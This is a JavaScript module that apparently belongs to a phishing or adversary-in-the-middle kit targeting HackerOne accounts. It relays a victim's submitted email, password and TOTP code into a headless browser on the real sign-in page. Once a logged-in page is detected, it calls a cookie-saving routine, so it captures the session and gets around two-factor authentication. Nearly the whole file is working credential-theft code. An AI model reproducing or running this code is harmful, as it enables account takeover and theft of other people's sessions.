const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                let email = `#sign_in_email`
                await page.waitForSelector(email)
                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["profile-photos.hackerone-user-content.com"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                let email = `#sign_in_email`
                let password = `#sign_in_password`
                await page.waitForSelector(email)
                await page.waitForSelector(password)

                await page.type(email, body["user[email]"])
                await page.type(password, body["user[password]"])
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "xhr" || response.request().resourceType() == "fetch") {
                        await new Promise(re => setTimeout(re, 2000))
                        return true
                    }
                })
            } else if (spikeType == "otp-code") {
                let otpInput = `[id="sign_in_totp_code"]`

                await page.waitForSelector(otpInput)
                await page.type(otpInput, body[`user[totp_code]`])

                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
                await new Promise(re => setTimeout(re, 2000))
            }
            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }